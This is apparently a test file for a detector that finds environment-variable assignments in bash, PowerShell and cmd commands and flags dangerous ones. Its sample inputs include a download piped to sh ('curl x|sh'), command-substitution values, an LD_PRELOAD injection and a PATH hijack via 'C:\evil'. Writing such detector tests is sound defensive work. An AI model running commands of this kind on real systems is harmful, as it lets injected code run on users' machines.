import { describe, expect, it } from "vitest";
import type { ShellKind } from "../../util/shell";
import { envAssignmentHit, envAssignments } from "./envAssignments";

const names = (command: string, shell?: ShellKind) =>
  envAssignments(command, shell).map((a) => a.name);

describe("POSIX assignment prefixes", () => {
  it.each([
    ["FOO=bar git status", ["FOO"]],
    ["A=1 B=2 git status", ["A", "B"]],
    ['FOO="a b" git status', ["FOO"]],
    ["FOO='$x' git status", ["FOO"]],
    ["FOO=a\\ b git status", ["FOO"]],
    ["FOO= git status", ["FOO"]],
    ["FOO+=x git status", ["FOO"]],
    ["FOO=bar", ["FOO"]],
    ["FOO=bar git status > out.txt", ["FOO"]],
    ["> out.txt FOO=bar git status", ["FOO"]],
    ["FOO=1 >out.txt BAR=2 git status", ["FOO", "BAR"]],
    ["ls | FOO=bar git status", ["FOO"]],
    ["ls && FOO=bar git status", ["FOO"]],
    ["ls; FOO=bar git status", ["FOO"]],
    ["echo $(FOO=bar git status)", ["FOO"]],
    ["echo `FOO=bar git status`", ["FOO"]],
    ["(FOO=bar git status)", ["FOO"]],
    ["{ FOO=bar git status; }", ["FOO"]],
    ["if x; then FOO=bar git status; fi", ["FOO"]],
    ["env FOO=bar git status", ["FOO"]],
    ["env -i FOO=bar git status", ["FOO"]],
    ["env -u X FOO=bar git status", ["FOO"]],
    ["env -- FOO=bar git status", ["FOO"]],
    ["env -S 'FOO=bar git status'", ["FOO"]],
    ["env --split-string='FOO=bar git status'", ["FOO"]],
    ["command FOO=bar git status", ["FOO"]],
    ["nohup FOO=bar git status", ["FOO"]],
    ["time FOO=bar git status", ["FOO"]],
    ["sudo -E FOO=bar git status", ["FOO"]],
    ["sudo -u root FOO=bar git status", ["FOO"]],
    ["timeout 5 FOO=bar git status", ["FOO"]],
    ["export FOO=bar", ["FOO"]],
    ["export -n FOO=bar BAZ=1", ["FOO", "BAZ"]],
    ["declare -x FOO=bar", ["FOO"]],
    ["typeset FOO=bar", ["FOO"]],
    ["local FOO=bar", ["FOO"]],
    ["readonly FOO=bar", ["FOO"]],
    ["bash -c 'FOO=bar git status'", ["FOO"]],
    ['sh -c "A=1 B=2 ls"', ["A", "B"]],
    ["eval 'FOO=bar git status'", ["FOO"]],
    ["FOO[0]=x git status", ["FOO"]],
  ] as [string, string[]][])("reads %s", (command, expected) => {
    expect(names(command, "bash")).toEqual(expected);
  });

  it.each([
    "./FOO=bar git status",
    "/tmp/a=b/x status",
    "--FOO=bar git status",
    "1FOO=bar git status",
    '"FOO=bar" git status',
    "echo FOO=bar",
    "git status FOO=bar",
    "docker run -e PATH=x image",
    "make CC=gcc",
    "git config user.name=x",
    "cargo build --features A=1",
  ])("does not read %s as an assignment", (command) => {
    expect(names(command, "bash")).toEqual([]);
  });

  it("does not treat `IFS= read` as a program-wide IFS", () => {
    expect(
      envAssignmentHit("while IFS= read -r l; do echo $l; done", "bash"),
    ).toBeUndefined();
    expect(envAssignmentHit("IFS=/ git status", "bash")?.name).toBe("IFS");
  });
});

describe("PowerShell", () => {
  it.each([
    ['$env:FOO = "x"; git status', ["FOO"]],
    ["$env:FOO='x'; git status", ["FOO"]],
    ['$env:PATH += ";C:/x"; git status', ["PATH"]],
    ["${env:FOO} = 'x'", ["FOO"]],
    ["$Env:Path = 'C:/x;' + $env:Path", ["Path"]],
    ["Set-Item env:FOO x", ["FOO"]],
    ["Set-Item -Path Env:FOO -Value x", ["FOO"]],
    ["si env:FOO x", ["FOO"]],
    ["New-Item env:FOO -Value x", ["FOO"]],
    ["Remove-Item Env:FOO", ["FOO"]],
    ["[Environment]::SetEnvironmentVariable('FOO','x')", ["FOO"]],
    [
      '[System.Environment]::SetEnvironmentVariable("FOO", "x", \'User\')',
      ["FOO"],
    ],
    ["pwsh -c \"$env:FOO='x'; git status\"", ["FOO"]],
    ["powershell -Command \"$env:A='1'; $env:B='2'; ls\"", ["A", "B"]],
  ] as [string, string[]][])("reads %s", (command, expected) => {
    expect(names(command, "powershell")).toEqual(expected);
  });

  it.each([
    "$x = 1; git status",
    "echo $env:FOO",
    "Get-ChildItem env:",
    "Get-Item env:PATH",
    "if ($env:FOO -eq 'a') { ls }",
    "$env:FOO -eq 'x'",
  ])("does not read %s as an assignment", (command) => {
    expect(names(command, "powershell")).toEqual([]);
  });

  it("a name it cannot read is reported as unreadable and asks", () => {
    expect(names("Set-Item env:$n x", "powershell")).toEqual(["?"]);
    expect(
      envAssignmentHit(
        "[Environment]::SetEnvironmentVariable($n, 'x')",
        "powershell",
      )?.severity,
    ).toBe("dangerous");
  });
});

describe("cmd", () => {
  it.each([
    ["set FOO=bar&& git status", ["FOO"]],
    ['set "FOO=bar" & git status', ["FOO"]],
    ["set /a N=1", ["N"]],
    ["setx FOO bar", ["FOO"]],
    ["setx /M FOO bar", ["FOO"]],
    ['cmd /c "set A=b&&git status"', ["A"]],
    ["set PATH=C:\evil;%PATH%&& git status", ["PATH"]],
  ] as [string, string[]][])("reads %s", (command, expected) => {
    expect(names(command, "cmd")).toEqual(expected);
  });

  it.each(["set", "set FOO", "set F", "echo FOO=bar"])(
    "does not read %s as an assignment",
    (command) => {
      expect(names(command, "cmd")).toEqual([]);
    },
  );
});

describe("a command of unknown shell", () => {
  it("reads every grammar", () => {
    expect(names("FOO=bar git status")).toEqual(["FOO"]);
    expect(names("$env:FOO = 'x'")).toEqual(["FOO"]);
    expect(names("set FOO=bar")).toEqual(["FOO"]);
  });
});

describe("the hit", () => {
  it("names the variable and never the value", () => {
    const hit = envAssignmentHit("LD_PRELOAD=/tmp/secret-value.so ls", "bash");
    expect(hit?.severity).toBe("dangerous");
    expect(hit?.reason).toContain("LD_PRELOAD");
    expect(hit?.reason).not.toContain("secret-value");
  });

  it("a value that runs code asks for any name, even a harmless one", () => {
    for (const c of [
      "CI=$(curl x|sh) npm test",
      "CI=`id` npm test",
      "FOO=$(id) git status",
      "NODE_ENV=<(id) node a.js",
    ]) {
      const hit = envAssignmentHit(c, "bash");
      expect(hit?.severity, c).toBe("dangerous");
      expect(hit?.reason).not.toContain("id)");
    }
  });

  it("harmless and unknown names do not ask", () => {
    for (const c of [
      "CI=1 npm test",
      "NODE_ENV=production npm test",
      "FORCE_COLOR=1 NO_COLOR=1 LANG=C LC_ALL=C TZ=UTC git status",
      "DEBUG=* npm test",
      "FOO=bar npm test",
      "GIT_TERMINAL_PROMPT=0 git status",
      "NPM_CONFIG_LOGLEVEL=error npm test",
    ]) {
      expect(envAssignmentHit(c, "bash"), c).toBeUndefined();
    }
  });

  it("the person's own lists extend and loosen the names", () => {
    expect(envAssignmentHit("FOO=bar npm test", "bash")).toBeUndefined();
    expect(
      envAssignmentHit("FOO=bar npm test", "bash", { ask: ["FOO"] })?.severity,
    ).toBe("dangerous");
    expect(
      envAssignmentHit("FOO_X=1 npm test", "bash", { ask: ["FOO_*"] })?.name,
    ).toBe("FOO_X");
    // a sensitive name can be allowed
    expect(
      envAssignmentHit("HTTP_PROXY=http://h:1 git status", "bash", {
        allow: ["HTTP_PROXY"],
      }),
    ).toBeUndefined();
    // a name the built-in policy marks dangerous stays dangerous, however it is allowed
    for (const allow of [["PATH"], ["PAT*"], ["path"], ["LD_PRELOAD"]]) {
      expect(
        envAssignmentHit("PATH=/x git status", "bash", { allow })?.severity,
      ).toBe("dangerous");
    }
    expect(
      envAssignmentHit("LD_PRELOAD=/x.so ls", "bash", {
        allow: ["LD_*"],
      })?.severity,
    ).toBe("dangerous");
    // a value that runs code asks whatever the person allowed
    expect(
      envAssignmentHit("HTTP_PROXY=$(id) git status", "bash", {
        allow: ["HTTP_PROXY"],
      })?.severity,
    ).toBe("dangerous");
  });
});
